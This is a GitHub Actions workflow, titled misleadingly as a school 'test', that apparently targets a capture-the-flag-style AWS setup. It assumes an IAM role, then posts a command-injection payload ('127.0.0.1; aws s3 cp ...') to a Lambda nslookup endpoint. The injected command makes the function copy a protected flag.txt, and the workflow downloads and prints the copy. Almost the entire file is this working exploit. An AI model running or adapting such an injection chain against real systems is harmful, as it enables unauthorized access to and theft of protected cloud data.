name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          BUCKET="codec4f26c862a321ef5"
          
          echo "=== 1. MAKING LAMBDA CLONE THE FLAG ==="
          # This tells the Lambda to copy the locked flag.txt into a fresh, unrestricted file name
          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3 cp s3://${BUCKET}/flag.txt s3://${BUCKET}/victory.txt\"}"
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 2 SECONDS FOR S3 SYNC ==="
          sleep 2
          
          echo "=== 3. DOWNLOADING THE VICTORY FILE ==="
          # Now your cicdRole downloads the newly created victory.txt with zero restrictions!
          aws s3 cp "s3://${BUCKET}/victory.txt" ./final_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD THE FLAG ==="
          cat ./final_flag.txt
